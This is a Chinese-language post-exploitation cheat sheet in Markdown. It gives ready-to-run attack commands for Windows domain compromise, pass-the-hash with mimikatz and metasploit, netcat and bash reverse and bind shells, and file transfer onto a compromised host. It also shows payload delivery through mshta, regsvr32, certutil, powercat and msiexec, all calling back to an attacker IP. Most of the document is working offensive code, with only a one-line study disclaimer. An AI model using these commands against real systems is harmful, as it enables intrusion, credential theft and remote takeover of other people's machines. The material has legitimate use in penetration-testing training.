# 后渗透笔记

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

# windows域
## Exchange
**工具**
- [APT34 Exchange 爆破工具](https://github.com/blackorbird/APT_REPORT/blob/master/APT34/Jason.zip)
- [grayddq/EBurst](https://github.com/grayddq/EBurst) - 这个脚本主要提供对 Exchange 邮件服务器的账户爆破功能，集成了现有主流接口的爆破方式。

**CVE-2019-1040**
- 文章
    - [结合CVE-2019-1040漏洞的两种域提权深度利用分析](https://www.freebuf.com/vuls/207399.html)

- POC | Payload | exp
    - [Ridter/CVE-2019-1040: CVE-2019-1040 with Exchange](https://github.com/Ridter/CVE-2019-1040)
    - [fox-it/cve-2019-1040-scanner](https://github.com/fox-it/cve-2019-1040-scanner)

## NTDS.DIT
**文章**
- [从NTDS.dit获取密码hash的三种方法](https://www.freebuf.com/sectool/176876.html)
- [导出域密码哈希值的多种方法介绍](https://www.freebuf.com/articles/system/177764.html)

---

# 横向扩展
## PTH/PTK/PTT

SMB 可以直接基于 TCP 协议或者 NetBIOS over TCP，SMB 的认证可以基于 SMB，也可以基于 kerberos，，这两种认证方式，前者本质上使用了 hash，后者本质上使用了 ticket，导致了 SMB 的 PtH 和 PtT 攻击存在的基础。

目前常用的 hash 传递工具都是通过 445 端口进行攻击的，也是因为 smb 使用了 ntml 认证，所以导致可以 hash 传递。

**PTH**
- **metasploit**
    ```bash
    use exploit/windows/smb/psexec
    set rhosts <ip>
    set smbuser <user>
    set smbpass <password>
    exploit
    ```

- **mimikatz**
    ```
    privilege::debug
    sekurlsa::pth /user:目标机器的用户名 /domain:目标机器的域(工作组则为.) /ntlm:用户名对应的hash "/run:mstsc.exe /restrictedadmin"
    ```

- **pth-winexe**

    PTH 套件每个工具都针对 WIN 下响应的 EXE 文件,如使用 Pth-winexe 可以借助哈希执行程序得到一个 cmdshell:
    ```bash
    export SMBHASH=xxxxxx...:xxxx...
    pth-winexe -U administrator% //target-ip cmd
    # no password 需要替换成空的 LM hash 加密值: aad3b435b51404eeaad3b435b51404ee
    ```

---

## 端口转发

**文章**
- [渗透基础——端口转发与代理](https://www.4hou.com/posts/PQMA)

**工具**
- [cw1997/NATBypass](https://github.com/cw1997/NATBypass) - 一款 lcx 在 golang 下的实现

---

**netcat**
- **tcp 端口连接**
    ```bash
    smtp: nc -nv 192.168.30.35 25 help
    pop3: nc -nv 192.168.30.35 110 user xxx pass xxx
    imap: nc -nv 192.168.30.35 143
    ```

- **chat**
    ```bash
    nc -nvlp 4444                  # A 主机
    nc -nv 192.168.30.35 4444      # B 主机
    ```

- **文件传输**
    ```bash
    # 收
    nc -nvlp 4444 > aaa                          # win
    nc -nvlp 4444 > aaa

    # 发
    nc -nv 192.168.30.35 4444 </usr/share/aaa    # kali
    ```

- **bind shell**
    ```bash
    # 被控端
    nc -lvp 4444 -e cmd.exe     # win
    nc -lvp 4444 -e /bin/bash   # linux

    # 攻击端
    nc -nv 192.168.30.35 4444

    python -c 'import pty; pty.spawn("/bin/bash")'
    export TERM=xterm
    ```

- **reverse shell**
    ```bash
    # 被控端
    nc -nv 192.168.30.35 4444 -e /bin/bash

    或

    bash -i >& /dev/tcp/192.168.30.35/4444 0>&1

    # 攻击端
    nc -lvp 4444

    python -c 'import pty; pty.spawn("/bin/bash")'
    export TERM=xterm
    ```

    ncat:
    ```bash
    # 被控端
    ncat lvp 4444 -e cmd.exe --allow 192.168.30.5 --ssl

    # 攻击端
    ncat -v 192.168.30.35 4444 --ssl

    python -c 'import pty; pty.spawn("/bin/bash")'
    export TERM=xterm
    ```

---

## 文件传输
### tftp

基于 udp,端口为 69

**攻击端起 tftp**
```bash
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /usr/share/windows-binaries/nc.exe /tftp/
chown -R nobody /tftp
```

**目标机**
```bash
tftp -i <kali-ip> GET nc.exe
```

---

### ftp

**攻击端**
```bash
apt-get install pure-ftpd

groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd username -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
./setup-ftp(输入要设置的密码)
```

目标机的远程 shell 上运行
```bash
echo open <kali-ip> 21> ftp.txt
echo username>> ftp.txt
echo password>> ftp.txt
echo bin >> ftp.txt
echo GET evil.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
```

目标机上传文件(连接状态):
```bash
ftp> put target.exe(如果是 windows 且文件在其他盘,需使用绝对路径)
```

关闭 ftp:
```bash
/etc/init.d/pure-ftpd stop
```

攻击端使用 python 起 ftp:
```
apt-get install python-pyftpdlib
mkdir /ftp
cd /ftp/
python -m pyftpdlib -p 21
```
此时目标机连接的时候,用户名为 anonymous,密码随意

---

### vbscript

```vb
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo strFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

攻击端起 http 服务
```bash
cp exploit.exe /var/www/
service apache2 start
```

在目标机执行 vb 命令,会生成 wget.vbs
```bash
dir wget.vbs
cscript wget.vbs http://<kali-ip>/exploit.exe (要下载的文件)exploit.exe(保存成的文件名)
```

---

### powershell

同样,攻击端起 http 服务

```
echo $storageDir =$pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://<kali-ip>/exploit.exe" >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```
在目标机执行 powershell 命令,会生成 wget.ps1
目标机执行:
```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

---

# GET shell

本部分总结一些获取 shell 的方法和过程

## windows下获取shell

**文章**
- [Get Reverse-shell via Windows one-liner](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)

**Mshta.exe**

Mshta.exe 运行 Microsoft HTML 应用程序主机，这是 Windows OS 实用程序，负责运行 HTA（HTML 应用程序）文件。可以用来运行 JavaScript 或 VBScript 的 HTML 文件。

Metasploit 包含“ HTA Web服务器”模块，该模块会生成恶意的 hta 文件。该模块托管一个 HTML 应用程序（HTA），该应用程序在打开时将通过 Powershell 运行有效负载。当用户导航到 HTA 文件时，在有效载荷执行之前 IE 会提示两次。

攻击端
```bash
use exploit/windows/misc/hta_server
set srvhost 192.168.1.109
set lhost 192.168.1.109
exploit
```
目标端
```cmd
mshta.exe http://192.168.1.109:8080/5EEiDSd70ET0k.hta
```

**Rundll32.exe**

Rundll32.exe 与 Windows 操作系统相关联，可调用从 DLL（16位或32位）导出的函数并将其存储在适当的内存库中。

Metasploit 还包含“ SMB Delivery”模块，该模块生成恶意的 dll 文件。该模块通过 SMB 服务器提供有效负载，并提供检索和执行生成的有效负载的命令。当前支持 DLL 和 Powershell。

攻击端
```bash
use exploit/windows/smb/smb_delivery
set srvhost 192.168.1.109
set lhost 192.168.1.109
exploit
```
目标端
```cmd
rundll32.exe \\192.168.1.109\vabFG\test.dll,0
```

**Regsvr32.exe**

Regsvr32 是一个命令行实用程序，用于注册和注销 OLE 控件，例如 Windows 注册表中的 DLL 和 ActiveX 控件。Windows XP 和更高版本的 Windows 的 ％systemroot％\ System32 文件夹中安装了 Regsvr32.exe。

Regsvr32使用 “squablydoo” 技术绕过应用程序白名单。签名的 Microsoft 二进制文件 Regsvr32 可以请求一个 .sct 文件，然后在其中执行包含的 PowerShell 命令。这两个 Web 请求（即 .sct 文件和 PowerShell 下载/执行）都可以在同一端口上发生。“PSH(Binary)”将向磁盘写入文件，允许下载/执行自定义二进制文件。

攻击端
```bash
use exploit/multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.109
set srvhost 192.168.1.109
exploit
```
目标端
```bash
regsvr32 /s /n /u /i:http://192.168.1.109:8080/xo31Jt5dIF.sct scrobj.dll
```

**Certutil.exe**

Certutil.exe 是作为证书服务的一部分安装的命令行程序。我们可以使用此工具在目标计算机上执行恶意 exe 文件，以获取 meterpreter 程序会话。

攻击端
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f exe > shell.exe
python -m SimpleHTTPServer 80
```
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.109
set lport 1234
exploit
```
目标端
```bash
certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe shell.exe & shell.exe
```

**Powershell.exe**

Powercat 是 PowerShell 的本机后门侦听器和 reverse shel，也称为 netcat 的修改版本，因为它集成了对生成的编码有效载荷的支持，msfvenom 可以做到这一点，并且还具有客户端到客户端的中继(Powercat 客户端的术语，允许连接两个单独的侦听器)。

攻击端
```bash
git clone https://github.com/besimorhino/powercat.git
cd powercat
python -m SimpleHTTPServer 80

nc -lvp 1234
```
目标端
```bash
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 1234 -e cmd"
```

**Batch File**

攻击端
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=4444 > 1.bat

python -m SimpleHTTPServer 80

nc -lvp 4444
```

目标端
```bash
powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))
```

**Cscript**

攻击端
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=1234 -f vbs > 1.vbs

python -m SimpleHTTPServer 80

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.109
set lport 1234
exploit
```

目标端
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://192.168.1.109/1.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```

**Msiexec.exe**

攻击端
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f msi > 1.msi

python -m SimpleHTTPServer 80

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.109
set lport 1234
exploit
```

目标端
```bash
msiexec /q /i http://192.168.1.109/1.msi
```

---

## linux下获取shell

**Tips**
```bash
bash -i >& /dev/tcp/192.168.30.35/4444 0>&1
```

- **bind shell**
    ```bash
    # 被控端
    nc -lvp 4444 -e cmd.exe     # win
    nc -lvp 4444 -e /bin/bash   # linux

    # 攻击端
    nc -nv 192.168.30.35 4444

    python -c 'import pty; pty.spawn("/bin/bash")'
    export TERM=xterm
    ```

- **reverse shell**
    ```bash
    # 被控端
    nc -nv 192.168.30.35 4444 -e /bin/bash

    或

    bash -i >& /dev/tcp/192.168.30.35/4444 0>&1

    # 攻击端
    nc -lvp 4444

    python -c 'import pty; pty.spawn("/bin/bash")'
    export TERM=xterm
    ```

    ncat:
    ```bash
    # 被控端
    ncat lvp 4444 -e cmd.exe --allow 192.168.30.5 --ssl

    # 攻击端
    ncat -v 192.168.30.35 4444 --ssl

    python -c 'import pty; pty.spawn("/bin/bash")'
    export TERM=xterm
    ```

---

# 权限提升

- 关于 linux 更多提权内容,见笔记 [提权笔记](./提权笔记.md#linux) linux 提权部分
- 关于 windows 更多提权内容,见笔记 [提权笔记](./提权笔记.md#win) win 提权部分

---

# 权限维持
**笔记**
- [权限维持](./权限维持笔记.md)

---

# 隐匿攻击
## 隐蔽隧道
- [ICMP隐蔽隧道从入门到精通](https://www.anquanke.com/post/id/152046)

## 侧信道
**PTP-RAT**
- https://www.pentestpartners.com/security-blog/exfiltration-by-encoding-data-in-pixel-colour-values/
- https://github.com/pentestpartners/PTP-RAT
